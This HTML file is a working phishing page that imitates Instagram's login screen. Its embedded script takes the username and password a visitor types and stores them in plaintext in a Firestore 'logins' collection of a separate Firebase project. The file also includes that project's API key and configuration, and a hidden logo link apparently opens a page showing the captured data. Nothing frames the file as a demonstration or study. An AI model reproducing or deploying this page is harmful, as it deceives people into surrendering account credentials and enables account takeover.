<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
      background-color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .logo {
      width: 200px;
      height: 80px;
      margin-bottom: 30px;
      background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgODAiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNmZmYiLz48Y2lyY2xlIGN4PSI0MCIgY3k9IjQwIiByPSIzMCIgZmlsbD0iIzAwOTVmNiIvPjxjaXJjbGUgY3g9IjgwIiBjeT0iNDAiIHI9IjMwIiBmaWxsPSIjMDA5NWY2Ii8+PGNpcmNsZSBjeD0iMTIwIiBjeT0iNDAiIHI9IjMwIiBmaWxsPSIjMDA5NWY2Ii8+PC9zdmc+');
      background-size: contain;
      background-repeat: no-repeat;
      cursor: pointer;
    }
    .login-form {
      width: 100%;
      max-width: 350px;
      padding: 20px;
      border-radius: 4px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
      background-color: white;
      margin-top: 20px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }
    button {
      width: 100%;
      padding: 8px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    @media (max-width: 480px) {
      .logo {
        width: 150px;
        height: 60px;
      }
      .login-form {
        width: 90%;
      }
    }
  </style>
</head>
<body>
  <div class="logo" id="instagramLogo"></div>
  <div class="login-form">
    <h2>Login</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log in</button>
    </form>
  </div>

  <script type="module">
    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyAVeEjtLg68DEK-dNtAHN5JFOy1NaevVjA",
      authDomain: "my-project-1-7e614.firebaseapp.com",
      projectId: "my-project-1-7e614",
      storageBucket: "my-project-1-7e614.firebasestorage.app",
      messagingSenderId: "807664093949",
      appId: "1:807664093949:web:98b8505fa2277371938c94",
      measurementId: "G-8DFGXF1QWX"
    };

    // Initialize Firebase
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js';
    import { getFirestore, addDoc, collection } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js';

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    document.getElementById('instagramLogo').addEventListener('click', () => {
      window.open('data.html', '_blank');
    });

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      try {
        await addDoc(collection(db, "logins"), { username, password });
        alert("Data sent successfully!");
      } catch (error) {
        console.error("Error:", error);
      }
    });
  </script>
</body>
</html>
